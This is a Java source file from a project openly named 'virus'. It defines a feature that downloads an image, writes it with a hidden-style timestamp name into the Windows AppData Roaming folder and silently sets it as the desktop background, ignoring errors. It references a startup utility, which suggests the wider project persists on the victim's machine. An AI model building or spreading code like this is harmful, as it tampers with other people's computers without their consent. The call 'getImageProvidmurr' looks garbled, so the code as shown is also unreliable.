package me.bannock.virus.features.impl;

import me.bannock.virus.features.Feature;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.utils.StartOnWindowsStartUtil;
import me.bannock.virus.utils.WindowsUtils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class FeatChangeBackground extends Feature {

    @Override
    public void run() {
        if (!config.shouldChangeBackground())
            return;

        final ImageProviderService imageProviderService = config.getImageProvidmurr();

        // Set background
        if (config.shouldChangeBackground()){
            File bg = new File(StartOnWindowsStartUtil.WINDOWS_APPDATA_ROAMING,
                    "/" + Long.toString(System.currentTimeMillis(), Character.MAX_RADIX) + ".png");
            try {
                Files.write(bg.toPath(),
                        imageProviderService.fetchBytes(imageProviderService.fetchImages(1).get(0)));
                WindowsUtils.changeBackground(bg.getAbsolutePath());
            } catch (IOException ignored) {}
        }
    }

}
